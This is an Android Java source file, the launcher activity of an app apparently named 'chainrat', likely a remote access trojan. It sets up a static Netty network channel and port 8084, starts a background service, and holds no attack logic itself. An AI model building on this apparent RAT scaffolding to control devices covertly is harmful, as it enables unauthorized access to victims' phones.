package com.nefi.chainrat;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import io.netty.channel.Channel;
import io.netty.util.internal.logging.InternalLoggerFactory;
import io.netty.util.internal.logging.JdkLoggerFactory;

public class MainActivity extends Activity {

    private static Channel channel;
    public static Channel getChannel(){
        return  channel;
    }
    public static void setChannel(Channel ch){
        channel = ch;
    }

    private static Context appContext;
    public static Context getAppContext(){
        return appContext;
    }

    public static final int port = 8084;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        appContext = getApplicationContext();
        InternalLoggerFactory.setDefaultFactory(JdkLoggerFactory.INSTANCE);
        setContentView(R.layout.activity_main);
        startService(new Intent(this, MainService.class));
        //finish();
    }
}